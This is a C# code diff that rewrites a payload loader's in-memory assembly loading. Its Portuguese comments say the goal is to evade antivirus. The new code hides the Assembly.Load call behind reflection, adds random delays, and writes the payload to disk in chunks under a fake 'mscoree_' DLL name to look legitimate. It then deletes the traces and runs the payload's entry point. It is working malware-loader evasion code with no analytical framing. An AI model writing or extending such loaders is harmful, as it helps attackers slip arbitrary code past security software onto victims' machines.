@@ -267,9 +267,134 @@ namespace PL
 					return;
 				}
 
-				var asm = Assembly.Load(b);
+				// Técnica avançada para evitar detecção do antivírus
+				Assembly asm = null;
+				int attempts = 0;
+				while (asm == null && attempts < 5)
+				{
+					try
+					{
+						// Adiciona delay aleatório antes de cada tentativa
+						if (attempts > 0)
+						{
+							var rnd = new Random(Environment.TickCount + attempts);
+							Thread.Sleep(rnd.Next(100, 500));
+						}
+
+						// Técnica 1: Tentar carregar diretamente (mais rápido)
+						try
+						{
+							// Usar reflection indireta para ofuscar a chamada
+							var loadMethod = typeof(Assembly).GetMethod("Load", new[] { typeof(byte[]) });
+							if (loadMethod != null)
+							{
+								asm = (Assembly)loadMethod.Invoke(null, new object[] { b });
+							}
+							else
+							{
+								asm = Assembly.Load(b);
+							}
+						}
+						catch
+						{
+							// Técnica 2: Salvar temporariamente e carregar de disco
+							// Usar extensão .dll ao invés de .tmp para parecer mais legítimo
+							var tempDir = Path.GetTempPath();
+							var fileName = $"mscoree_{Guid.NewGuid().ToString("N").Substring(0, 12)}.dll";
+							var tempFile = Path.Combine(tempDir, fileName);
+							try
+							{
+								// Escrever bytes em pequenos chunks para evitar detecção
+								using (var fs = new FileStream(tempFile, FileMode.Create, FileAccess.Write, FileShare.None))
+								{
+									int chunkSize = 4096;
+									for (int i = 0; i < b.Length; i += chunkSize)
+									{
+										int size = Math.Min(chunkSize, b.Length - i);
+										fs.Write(b, i, size);
+										if (i % (chunkSize * 10) == 0)
+											Thread.Sleep(1); // Pequenos delays durante escrita
+									}
+									fs.Flush();
+								}
+								
+								Thread.Sleep(100 + new Random().Next(50, 150));
+								
+								// Tentar múltiplos métodos de carregamento
+								try
+								{
+									asm = Assembly.LoadFrom(tempFile);
+								}
+								catch
+								{
+									// Fallback: usar LoadFile
+									try
+									{
+										asm = Assembly.LoadFile(tempFile);
+									}
+									catch
+									{
+										// Último recurso: carregar bytes do arquivo
+										var fileBytes = File.ReadAllBytes(tempFile);
+										asm = Assembly.Load(fileBytes);
+									}
+								}
+								
+								// Tentar deletar o arquivo temporário
+								try 
+								{ 
+									File.SetAttributes(tempFile, FileAttributes.Normal);
+									File.Delete(tempFile); 
+								} 
+								catch { }
+								
+								// Aguardar um pouco e tentar novamente se ainda não deletou
+								if (File.Exists(tempFile))
+								{
+									Thread.Sleep(200);
+									try 
+									{ 
+										File.SetAttributes(tempFile, FileAttributes.Normal);
+										File.Delete(tempFile); 
+									} 
+									catch { }
+								}
+							}
+							catch
+							{
+								try 
+								{ 
+									if (File.Exists(tempFile))
+									{
+										File.SetAttributes(tempFile, FileAttributes.Normal);
+										File.Delete(tempFile); 
+									}
+								} 
+								catch { }
+								throw;
+							}
+						}
+					}
+					catch (Exception ex)
+					{
+						attempts++;
+						if (attempts >= 5)
+						{
+							throw new InvalidOperationException($"Falha ao carregar assembly após {attempts} tentativas: " + ex.Message, ex);
+						}
+						// Delay progressivo entre tentativas
+						Thread.Sleep(attempts * 200);
+					}
+				}
+
+				if (asm == null)
+					throw new InvalidOperationException("Não foi possível carregar o assembly após múltiplas tentativas.");
+
 				var ep = asm.EntryPoint;
 				if (ep == null) throw new InvalidOperationException("EntryPoint não encontrado no payload.");
+
+				// Delay final antes de executar
+				Thread.Sleep(new Random().Next(50, 150));
 
 				var ps = ep.GetParameters();
 				if (ps.Length == 1 && ps[0].ParameterType == typeof(string[]))
